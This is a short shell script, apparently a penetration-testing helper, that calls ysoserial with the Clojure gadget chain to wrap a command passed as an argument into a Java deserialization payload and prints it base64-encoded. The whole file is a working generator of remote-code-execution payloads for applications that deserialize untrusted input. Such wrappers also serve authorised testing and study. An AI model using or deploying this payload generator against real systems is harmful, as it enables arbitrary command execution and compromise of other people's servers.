#!/bin/sh
gadget="Clojure"
cmd="$1"
payload=$(ysoserial "$gadget" "$cmd")
printf "%s" "$payload" | base64
